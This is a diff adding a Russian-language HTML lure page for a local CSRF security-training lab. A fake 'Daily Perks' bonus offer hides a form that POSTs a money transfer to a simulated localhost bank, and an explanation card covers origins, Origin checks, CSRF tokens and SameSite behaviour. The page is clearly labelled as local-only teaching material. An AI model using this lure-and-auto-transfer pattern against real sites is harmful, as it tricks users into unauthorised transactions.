@@ -1,0 +1,196 @@
+<!doctype html>
+<html lang="ru">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta name="theme-color" content="#211629">
+
+  <title>Daily Perks — CSRF Simulation</title>
+
+  <link rel="stylesheet" href="/styles.css">
+</head>
+
+<body>
+
+  <main class="attacker-shell">
+
+    <div class="warning-strip">
+      <span>⚠</span>
+      ISOLATED SECURITY TRAINING SIMULATION
+    </div>
+
+    <section class="offer-card">
+
+      <div class="offer-nav">
+
+        <div class="offer-logo">
+          <span>✦</span> daily perks
+        </div>
+
+        <span class="ad-label">
+          SPONSORED DEMO
+        </span>
+
+      </div>
+
+      <div class="offer-body">
+
+        <p class="eyebrow">
+          A LITTLE SOMETHING FOR YOU
+        </p>
+
+        <h1>
+          Твой день.<br>
+          <em>Твой бонус.</em>
+        </h1>
+
+        <p class="description">
+          Нажми кнопку ниже, чтобы забрать специальный
+          бонус в нашей учебной симуляции.
+        </p>
+
+        <div class="bonus-box">
+
+          <span class="gift">✧</span>
+
+          <div>
+
+            <b>10 bonus points</b>
+
+            <small>
+              Demo offer · no real value
+            </small>
+
+          </div>
+
+          <span class="sparkle">✦</span>
+
+        </div>
+
+        <!--
+          Локальная форма для учебной симуляции.
+          Не направлять на реальные сторонние сервисы.
+        -->
+
+        <form
+          id="csrfForm"
+          method="POST"
+          action="http://127.0.0.1:3000/api/transfer"
+          target="resultFrame"
+        >
+
+          <input
+            type="hidden"
+            name="recipientId"
+            value="2"
+          >
+
+          <input
+            type="hidden"
+            name="amount"
+            value="10"
+          >
+
+          <button
+            class="claim-button"
+            type="submit"
+          >
+            Получить бонус <span>→</span>
+          </button>
+
+        </form>
+
+        <iframe
+          title="hidden local lab response"
+          name="resultFrame"
+          class="hidden-frame"
+        ></iframe>
+
+        <p
+          id="feedback"
+          class="feedback"
+          role="status"
+        >
+          Это отдельный origin:
+          127.0.0.1:4000.
+          Ответ victim-сайта недоступен этой странице.
+        </p>
+
+      </div>
+
+      <div class="offer-foot">
+
+        <span>DAILY PERKS · DEMO</span>
+
+        <span>TRAINING PAGE</span>
+
+      </div>
+
+    </section>
+
+    <section class="explain-card">
+
+      <h2>Что моделируется?</h2>
+
+      <p>
+        Форма отправляет обычный POST-запрос
+        на локальный victim-сайт.
+
+        В режиме без защиты браузер может приложить
+        подходящую сессионную cookie автоматически.
+
+        Страница-источник не читает cookie
+        и не читает ответ victim-сайта.
+      </p>
+
+      <div class="origin-pair">
+
+        <div>
+
+          <small>THIS PAGE</small>
+
+          <b>127.0.0.1:4000</b>
+
+        </div>
+
+        <span>↗</span>
+
+        <div>
+
+          <small>TARGET</small>
+
+          <b>127.0.0.1:3000</b>
+
+        </div>
+
+      </div>
+
+      <p class="caution">
+        Важно: здесь разные origins из-за портов,
+        но один hostname и одна схема — это same-site
+        лаборатория. Она нужна для демонстрации проверки
+        Origin и CSRF-токенов; SameSite=Lax в таком
+        сценарии не обязан блокировать cookie.
+      </p>
+
+      <a
+        href="http://127.0.0.1:3000"
+        class="back-link"
+      >
+        ← Вернуться в Northstar Bank
+      </a>
+
+    </section>
+
+    <footer>
+      LOCAL ONLY · SYNTHETIC DATA · DO NOT USE AGAINST REAL SERVICES
+    </footer>
+
+  </main>
+
+  <script src="/attacker.js" defer></script>
+
+</body>
+</html>
